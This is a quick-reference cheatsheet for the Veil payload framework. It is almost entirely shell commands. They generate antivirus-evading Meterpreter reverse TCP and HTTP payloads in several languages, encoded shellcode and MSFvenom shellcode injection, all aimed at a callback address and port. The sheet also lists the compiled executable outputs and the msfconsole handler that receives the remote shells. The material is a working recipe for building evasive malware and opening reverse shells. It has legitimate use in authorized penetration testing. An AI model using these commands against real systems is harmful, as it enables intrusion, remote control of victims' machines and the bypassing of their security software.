# Veil Cheatsheet

## Quick Reference

### Installation

```bash
sudo apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```

### Main Commands

```bash
# Launch Veil
./Veil.py

# List payloads
./Veil.py --list-payloads

# List tools
./Veil.py --list-tools

# Show version
./Veil.py --version

# Update Veil
./Veil.py --update

# Regenerate config
./Veil.py --config
```

### Veil-Evasion (Payload Generation)

```bash
# Go-based reverse TCP
./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 192.168.1.100 --port 4444

# Python-based reverse TCP
./Veil.py -t Evasion -p python/meterpreter/rev_tcp.py --ip 192.168.1.100 --port 4444

# C-based reverse HTTP
./Veil.py -t Evasion -p c/meterpreter/rev_http.py --ip 192.168.1.100 --port 4444

# PowerShell reverse TCP
./Veil.py -t Evasion -p powershell/meterpreter/rev_tcp.py --ip 192.168.1.100 --port 4444

# Ruby-based reverse TCP
./Veil.py -t Evasion -p ruby/meterpreter/rev_tcp.py --ip 192.168.1.100 --port 4444
```

### Veil-Ordnance (Shellcode Generation)

```bash
# Generate reverse TCP shellcode
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.100 --port 4444

# With encoder
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.100 --port 4444 -e shikata_ga_nai

# With bad characters
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.100 --port 4444 -b '\x00\x0a'

# List encoders
./Veil.py -t Ordnance --list-encoders

# Show stats
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.100 --port 4444 --print-stats
```

### With MSFvenom Integration

```bash
# Use MSFvenom shellcode in Veil
./Veil.py -t Evasion -p c/shellcode_inject/virtual_alloc.py --ip 192.168.1.100 --port 4444 --msfvenom windows/meterpreter/reverse_tcp
```

### Output Locations

```bash
# Compiled executable
/var/lib/veil/output/compiled/payload.exe

# Source code
/var/lib/veil/output/source/payload.go

# Handler resource script
/var/lib/veil/output/handlers/payload.rc
```

### Launching Handler

```bash
msfconsole -q -r /var/lib/veil/output/handlers/payload.rc
```

### Available Payload Languages

| Language | Module Path | Characteristics |
|----------|-------------|-----------------|
| Go | `go/meterpreter/rev_tcp.py` | Statically compiled, no runtime deps |
| Python | `python/meterpreter/rev_tcp.py` | PyInstaller compilation |
| C | `c/meterpreter/rev_http.py` | MinGW compilation |
| Ruby | `ruby/meterpreter/rev_tcp.py` | OCRA compilation |
| PowerShell | `powershell/meterpreter/rev_tcp.py` | AMSI-aware |

### Cleanup

```bash
# Clean all generated payloads
./Veil.py --clean
```

### Troubleshooting

```bash
# Fix "0 payloads loaded"
cd /usr/share/veil/config/
sudo ./update-config.py

# Rebuild WINE environment
cd /usr/share/veil/
./config/setup.sh --force
```
